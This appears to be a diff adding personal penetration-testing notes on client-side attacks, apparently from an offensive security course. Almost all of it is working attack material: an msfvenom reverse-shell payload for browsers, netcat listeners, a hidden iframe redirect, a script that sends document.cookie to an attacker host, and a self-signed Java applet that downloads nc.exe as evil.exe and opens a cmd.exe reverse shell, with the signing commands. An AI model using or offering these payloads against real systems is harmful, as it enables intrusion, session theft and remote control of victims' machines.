@@ -1,0 +1,41 @@
+CLIENT-SIDE ATTACKS
+
+BROWSER VULNERABILITY EXPLOITATION
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.207 LPORT=443 -f js_le -e generic/none
+	/var/www/html
+	cp /path/to/exploit.html .
+	service apache2 start
+	nc -lvp 443
+	
+MALICIOUS JAVASCRIPT
+	<iframe SRC="http://10.11.0.5/report" height = "0" width ="0"></iframe>
+		-hidden iframe redirect
+
+		
+MALICIOUS PHP
+	<script>new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;</script>
+
+		
+JAVA SIGNED APPLET ATTACK
+	
+	'<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.5:80/evil.exe"></applet>
+	
+	cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe
+	
+	f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.5 443 -e cmd.exe");
+
+	nc -lvp 443
+	
+	APPLET SIGNING
+	javac -source 1.7 -target 1.7 Java.java
+	echo “Permissions: all-permissions” > /root/manifest.txt
+	jar cvf Java.jar Java.class
+	keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
+	jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
+	cp Java.class SignedJava.jar /var/www/html/
+	
+	JAVA LOAD HTML
+	/var/www/html/java.html
+	<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.5:80/evil.exe"></applet>
+	
+	
